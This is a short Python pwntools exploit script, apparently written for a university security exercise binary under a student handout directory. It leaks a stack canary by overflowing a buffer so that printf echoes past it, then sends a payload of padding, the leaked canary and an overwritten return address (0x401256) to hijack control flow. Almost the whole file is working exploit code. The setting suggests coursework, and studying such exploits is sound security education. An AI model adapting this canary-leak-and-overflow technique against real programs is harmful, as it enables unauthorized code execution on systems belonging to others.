#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = '/home/student/handout/exercise3/exercise3a'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

r = start()

# You can now communicate with the process, e.g.,
# r.sendline("AAAAA")
# r.recvline()

# printf will print the string from the given starting address to the null '\0' character.
#
print(r.recvline())
r.sendline(b'A' * 187)
output1 = r.recvline()
print(output1)
hint = r.recvline()  ### '$CANARY is not the password\n'
print(hint)

canary = hint[0: (-1) * len(" is not the password\n")]
print(canary)

padding = b'A' * 188
command = padding + canary + b'A' * (16 + 8) + p64(0x401256) + b"\n"

r.sendline(command)
print(r.recvall(timeout=3))




